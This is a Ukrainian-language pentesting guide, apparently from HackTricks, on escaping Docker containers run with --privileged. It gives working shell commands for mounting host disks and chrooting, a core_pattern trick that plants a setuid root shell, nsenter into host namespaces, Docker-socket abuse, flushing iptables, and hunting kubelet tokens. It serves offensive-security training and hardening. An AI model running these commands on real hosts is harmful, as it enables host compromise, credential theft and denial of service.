# Втеча з контейнерів з `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Контейнер, запущений з `--privileged`, не те саме, що звичайний контейнер із однією-двома додатковими правами. На практиці `--privileged` видаляє або послаблює кілька стандартних засобів захисту середовища виконання, які зазвичай відокремлюють робоче навантаження від небезпечних ресурсів хоста. Точний ефект все ще залежить від середовища виконання та хоста, але для Docker типовий результат такий:

- надаються всі capabilities
- обмеження device cgroup знімаються
- багато файлових систем ядра перестають монтуватися лише для читання
- за замовчуванням замасковані шляхи procfs зникають
- фільтрація seccomp вимкнена
- обмеження AppArmor вимкнені
- ізоляція SELinux вимкнена або замінена значно ширшою міткою

Важливий наслідок у тому, що привілейованому контейнеру зазвичай **не** потрібен витончений експлойт ядра. У багатьох випадках він може просто взаємодіяти з пристроями хоста, файловими системами ядра, орієнтованими на хост, або інтерфейсами середовища виконання безпосередньо, а потім перейти в shell хоста.

## Що `--privileged` автоматично не змінює

`--privileged` **не** автоматично приєднується до просторів імен PID, network, IPC або UTS хоста. Привілейований контейнер все ще може мати приватні простори імен. Це означає, що деякі ланцюги втечі вимагають додаткову умову, наприклад:

- bind mount хоста
- спільне використання PID хоста
- використання мережі хоста
- видимі пристрої хоста
- інтерфейси proc/sys доступні для запису

Ці умови часто легко задовольнити в реальних випадках неправильних конфігурацій, але концептуально вони відокремлені від самого `--privileged`.

## Шляхи втечі

### 1. Змонтувати диск хоста через доступні пристрої

Привілейований контейнер зазвичай бачить значно більше вузлів пристроїв у `/dev`. Якщо блочний пристрій хоста видно, найпростішою втікою є змонтувати його і виконати `chroot` у файлову систему хоста:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Якщо кореневий розділ не очевидний, спочатку перерахуйте структуру блоків:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Якщо практичний шлях — розмістити setuid helper у записуваному host mount замість `chroot`, пам'ятайте, що не кожна файлова система підтримує біт setuid. Швидка перевірка можливостей на хості:
```bash
mount | grep -v "nosuid"
```
Це корисно, оскільки записувані шляхи у файлових системах з `nosuid` значно менш цікаві для класичних робочих процесів "drop a setuid shell and execute it later".

Ослаблені механізми захисту, якими тут зловживають, такі:

- повний доступ до пристроїв
- широкі capabilities, особливо `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Монтування або повторне використання host bind mount та `chroot`

Якщо коренева файловa система хоста вже змонтована всередині контейнера, або якщо контейнер може створити необхідні mounts тому, що він privileged, то host shell часто знаходиться всього за одним `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо не існує host root bind mount, але сховище хоста доступне, створіть його:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Цей шлях зловживання:

- ослаблені mount-обмеження
- повні capabilities
- відсутність MAC confinement

Пов'язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Зловживання записуваним `/proc/sys` або `/sys`

Одна з головних наслідків `--privileged` — значне послаблення захисту procfs та sysfs. Це може відкрити інтерфейси ядра, доступні з хоста, які зазвичай приховані або змонтовані тільки для читання.

Класичний приклад — `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Інші шляхи високої цінності включають:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Цей шлях зловживається:

- missing masked paths
- missing read-only system paths

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Використовуйте повні capabilities для втечі через mount або namespace

Привілейований контейнер отримує можливості, які зазвичай видаляються зі стандартних контейнерів, включаючи `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` та багато інших. Часто цього достатньо, щоб перетворити локальний foothold на host escape, щойно з’явиться інша експонована поверхня.

Простий приклад — монтування додаткових файлових систем і використання namespace entry:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Якщо PID хоста також спільний, крок стає ще коротшим:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Цей шлях зловживає:

- набором привілейованих можливостей за замовчуванням
- опційним спільним використанням PID хоста

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Привілейований контейнер часто має видимий стан runtime хоста або його сокети. Якщо доступний сокет Docker, containerd або CRI-O, найпростіший підхід часто полягає у використанні runtime API для запуску другого контейнера з доступом до хоста:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Для containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Цей шлях зловживає:

- зловживання доступом до привілейованого runtime
- host bind mounts, створені самим runtime

Пов'язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Усунення побічних ефектів мережевої ізоляції

`--privileged` сам по собі не приєднує контейнер до простору імен мережі хоста, але якщо контейнер також має `--network=host` або інший доступ до мережі хоста, то весь мережевий стек стає змінним:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це не завжди безпосередня оболонка на хості (host shell), але може призвести до denial of service, перехоплення трафіку або доступу до служб керування, доступних лише через loopback.

Пов'язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Читання секретів хоста та стану виконання

Навіть коли чистий shell escape не відбувається негайно, привілейовані контейнери часто мають достатній доступ, щоб читати секрети хоста, kubelet state, runtime metadata та файлові системи сусідніх контейнерів:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Якщо `/var` є host-mounted або runtime directories видимі, цього може бути достатньо для lateral movement або cloud/Kubernetes credential theft навіть до отримання host shell.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Перевірки

Метою наведених нижче команд є підтвердження, які privileged-container escape families є негайно застосовними.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Що тут цікаво:

- повний набір прав (capabilities), особливо `CAP_SYS_ADMIN`
- доступний для запису proc/sys
- видимі пристрої хоста
- відсутній seccomp та MAC confinement
- runtime sockets або host root bind mounts

Будь-який із них може бути достатнім для post-exploitation. Кілька таких разом зазвичай означають, що контейнер фактично знаходиться в один–два кроки (команди) від компрометації хоста.

## Related Pages

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
